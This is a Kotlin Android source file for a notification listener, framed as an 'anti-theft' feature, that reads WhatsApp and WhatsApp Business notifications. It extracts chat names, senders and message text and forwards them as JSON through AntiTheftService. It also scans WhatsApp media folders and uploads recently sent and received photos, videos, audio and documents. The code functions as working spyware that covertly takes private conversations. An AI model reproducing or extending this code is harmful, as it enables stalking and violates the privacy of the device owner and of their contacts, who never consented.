package com.androidprotect

import android.app.Notification
import android.app.Person
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Parcelable
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.serialization.json.Json
import kotlinx.serialization.builtins.serializer
import java.io.File

class WhatsAppNotificationListener : NotificationListenerService() {

    private val handler = Handler(Looper.getMainLooper())
    private val scannedTimestamps = mutableSetOf<Long>()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return
        val baseTimestamp = sbn.postTime

        val title = extras.getString(Notification.EXTRA_TITLE)?.take(40) ?: ""
        val summary = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.take(60) ?: ""
        Log.d("WhatsAppListener", "onNotificationPosted pkg=${sbn.packageName} title='$title' summary='$summary'")

        val messages = extractMessages(extras, baseTimestamp)
        if (messages.isEmpty()) {
            Log.d("WhatsAppListener", "No messages extracted from notification")
            return
        }

        messages.firstOrNull()?.address?.takeIf { it.isNotBlank() }?.let {
            lastAddress = it
        }

        for (msg in messages) {
            val mediaType = detectMediaType(msg.content)
            if (mediaType != null) {
                val chatName = msg.address
                Log.d("WhatsAppListener", "Media detected: type=$mediaType chat=$chatName, scheduling scan")
                handler.postDelayed({ scanAndUploadMedia(mediaType, chatName, msg.timestamp) }, 5000)
                if (!isMediaOnlyText(msg.content)) {
                    sendWhatsAppMessage(msg)
                }
            } else {
                sendWhatsAppMessage(msg)
            }
        }
    }

    private fun extractMessages(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val fromMessagingStyle = extractFromMessagingStyle(extras, baseTimestamp)
        if (fromMessagingStyle.isNotEmpty()) return fromMessagingStyle
        return extractFromTitleText(extras, baseTimestamp)
    }

    @Suppress("UNCHECKED_CAST")
    private fun extractFromMessagingStyle(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val result = mutableListOf<WhatsMessage>()

        val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim() ?: ""
        val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) || conversationTitle.isNotBlank()

        val messagesBundle = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            ?: extras.getSerializable(Notification.EXTRA_MESSAGES) as? Array<Bundle>
            ?: return result

        for (bundle in messagesBundle.filterIsInstance<Bundle>()) {
            val text = bundle.getCharSequence("text")?.toString() ?: continue
            if (text.isBlank()) continue
            if (isStatusText(text)) continue

            val timestamp = if (bundle.containsKey("timestamp")) {
                bundle.getLong("timestamp", baseTimestamp)
            } else baseTimestamp

            val sender = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                (bundle.getParcelable<Parcelable>("sender_person") as? Person)?.name?.toString()?.trim() ?: ""
            } else {
                bundle.getCharSequence("sender")?.toString()?.trim() ?: ""
            }

            val chatName = normalizeChatName(conversationTitle.ifBlank { sender })
            if (chatName.isBlank() || isGenericName(chatName)) continue

            val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
                "$sender: $text"
            } else text

            result.add(WhatsMessage(
                address = chatName,
                name = chatName,
                content = body,
                timestamp = timestamp
            ))
        }

        return result
    }

    private fun extractFromTitleText(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val result = mutableListOf<WhatsMessage>()

        val rawTitle = extras.getString(Notification.EXTRA_TITLE)?.trim() ?: ""
        val rawText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            ?: return result

        if (rawText.isBlank()) return result
        if (isStatusText(rawText)) return result

        val title = normalizeChatName(cleanTitle(rawTitle))
        val text = cleanSummaryPrefix(rawText)

        val (sender, body) = parseGroupSender(text)
        val chatName = title.ifBlank { normalizeChatName(sender) }
        if (chatName.isBlank() || isGenericName(chatName)) return result

        result.add(WhatsMessage(
            address = chatName,
            name = chatName,
            content = body,
            timestamp = baseTimestamp
        ))
        return result
    }

    private fun cleanTitle(title: String): String {
        if (title.isBlank()) return ""
        val lower = title.lowercase()
        if (lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem" ||
            lower.startsWith("whatsapp") || lower.startsWith("wa business")) return ""
        return title.replace(Regex("\\s*\\(\\d+\\s+mensagens?\\).*$", RegexOption.IGNORE_CASE), "").trim()
    }

    private fun cleanSummaryPrefix(text: String): String {
        return text.replace(Regex("^\\(\\d+\\s+mensagens?\\):\\s*", RegexOption.IGNORE_CASE), "").trim()
    }

    private fun parseGroupSender(text: String): Pair<String, String> {
        val idx = text.indexOf(": ")
        return if (idx in 1..39) {
            text.substring(0, idx) to text.substring(idx + 2)
        } else {
            "" to text
        }
    }

    private fun isGenericName(name: String): Boolean {
        val lower = name.lowercase()
        return lower == "whatsapp" || lower == "wa business" || lower == "whatsapp business" ||
                lower == "nova mensagem" || lower == "mensagem" ||
                lower == "conversas" || lower == "chats" || lower == "status" ||
                lower == "ligações" || lower == "calls" ||
                lower == "backup em andamento" || lower == "backup" ||
                lower.contains("procurando") || lower.contains("backup") ||
                lower.contains("não foi possível") || lower.contains("nao foi possivel")
    }

    private fun isStatusText(text: String): Boolean {
        val lower = text.lowercase().trim()
        return lower.contains("procurando novas mensagens") ||
                lower.contains("preparando o backup") ||
                lower.contains("backup em andamento") ||
                lower.contains("mensagens de") ||
                lower.contains("não foi possível") ||
                lower.contains("nao foi possivel") ||
                lower == "nova mensagem" ||
                lower == "mensagem" ||
                lower.startsWith("📷 foto") ||
                lower.startsWith("🎤 áudio") ||
                lower.startsWith("🎥 vídeo") ||
                lower.startsWith("📷📷") ||
                lower.startsWith("🎤🎤") ||
                lower.startsWith("🎥🎥") ||
                lower.contains("toque para")
    }

    private fun sendWhatsAppMessage(msg: WhatsMessage) {
        try {
            val cleanName = normalizeChatName(msg.address)
            if (cleanName.isBlank()) {
                Log.w("WhatsAppListener", "Skipping message: blank chat name for content='${msg.content.take(40)}'")
                return
            }
            val address = Json.encodeToString(String.serializer(), cleanName)
            val name = Json.encodeToString(String.serializer(), cleanName)
            val content = Json.encodeToString(String.serializer(), msg.content)
            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
            val sent = AntiTheftService.sendRawMessage(payload)
            Log.d("WhatsAppListener", "forwarded message to $cleanName sent=$sent content='${msg.content.take(40)}'")
        } catch (e: Exception) {
            Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
        }
    }

    private fun detectMediaType(content: String): String? {
        val lower = content.lowercase()
        return when {
            lower.contains("mensagem de voz") || lower.contains("voice message") -> "audio"
            lower.contains("audio") || lower.contains(" áudio") -> "audio"
            lower.contains("video") || lower.contains("vídeo") -> "video"
            lower.contains("foto") || lower.contains("📷") || lower.contains("imagem") -> "image"
            lower.contains("documento") || lower.contains("document") -> "document"
            lower.contains("figurinha") || lower.contains("sticker") -> "image"
            lower.contains("gif") -> "image"
            else -> null
        }
    }

    private fun isMediaOnlyText(content: String): Boolean {
        val trimmed = content.trim()
        return trimmed.matches(Regex("^[\\p{So}\\p{Cc}\\d\\s():.,/-]+$")) ||
               trimmed.matches(Regex("^[📷🎥🎤📹🏷️📎](\\s*\\(.+\\))?$")) ||
               trimmed.lowercase().let { lower ->
                   lower.startsWith("foto") || lower.startsWith("imagem") ||
                   lower.startsWith("vídeo") || lower.startsWith("video") ||
                   lower.startsWith("áudio") || lower.startsWith("audio") ||
                   lower.startsWith("mensagem de voz") ||
                   lower.startsWith("documento") ||
                   lower.startsWith("figurinha") ||
                   lower.startsWith("sticker") ||
                   lower.startsWith("gif")
               }
    }

    private fun scanAndUploadMedia(mediaType: String, chatName: String, timestamp: Long) {
        if (scannedTimestamps.contains(timestamp)) return
        scannedTimestamps.add(timestamp)
        if (scannedTimestamps.size > 100) scannedTimestamps.clear()

        val now = System.currentTimeMillis()
        val cutoff = now - 60_000

        val folders = when (mediaType) {
            "image" -> WhatsAppPaths.allImageFolders().map { File(it) }
            "video" -> WhatsAppPaths.allVideoFolders().map { File(it) }
            "audio" -> WhatsAppPaths.allAudioFolders().map { File(it) }
            "document" -> WhatsAppPaths.allDocumentFolders().map { File(it) }
            else -> emptyList()
        }

        for (dir in folders) {
            if (!dir.exists() || !dir.isDirectory) continue
            val isSent = dir.name == "Sent" || dir.absolutePath.contains("/Sent")
            val files = dir.listFiles() ?: continue
            for (file in files) {
                if (!file.isFile) continue
                if (file.lastModified() < cutoff) continue
                if (file.length() < 1000) continue
                if (scannedTimestamps.contains(file.absolutePath.hashCode().toLong())) continue

                scannedTimestamps.add(file.absolutePath.hashCode().toLong())
                val caption = when (mediaType) {
                    "image" -> "📷 Imagem"
                    "video" -> "🎥 Vídeo"
                    "audio" -> "🎤 Áudio"
                    else -> "📎 Arquivo"
                }
                val address = chatName
                Log.d("WhatsAppListener", "Uploading $mediaType ${if (isSent) "sent" else "received"}: ${file.name} (${file.length()} bytes) chat=$address")
                AntiTheftService.uploadWhatsAppMedia(file, mediaType, isSent, address, chatName, caption)
            }
        }
    }

    /**
     * Normalizes chat name by:
     * - Stripping leading/trailing emojis (📷, 🎤, 🎥, etc.)
     * - Removing message-count suffixes like "(6 mensagens)"
     * - Removing sender suffixes like ": suporte24h"
     */
    private fun normalizeChatName(name: String): String {
        var clean = name.trim()

        // Strip leading emojis and special chars
        clean = clean.replace(Regex("^[\\p{So}\\p{Cn}]+"), "")

        // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
        clean = clean.replace(Regex("\\s*[(\\[]\\d+\\s+mensagens?\\s*(novas?)?[)\\]].*$", RegexOption.IGNORE_CASE), "")
        clean = clean.replace(Regex("\\s*:\\s*\\d+\\s+mensagens?.*$", RegexOption.IGNORE_CASE), "")

        // Remove trailing colon fragments (e.g. ": suporte24h")
        clean = clean.replace(Regex("\\s*:.*$"), "")

        return clean.trim()
    }

    private data class WhatsMessage(
        val address: String,
        val name: String,
        val content: String,
        val timestamp: Long
    )

    companion object {
        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")
        @Volatile private var lastAddress: String = ""

        fun lastIncomingAddress(): String = lastAddress

        fun isEnabled(context: Context): Boolean {
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains("${context.packageName}/${WhatsAppNotificationListener::class.java.name}")
        }
    }
}
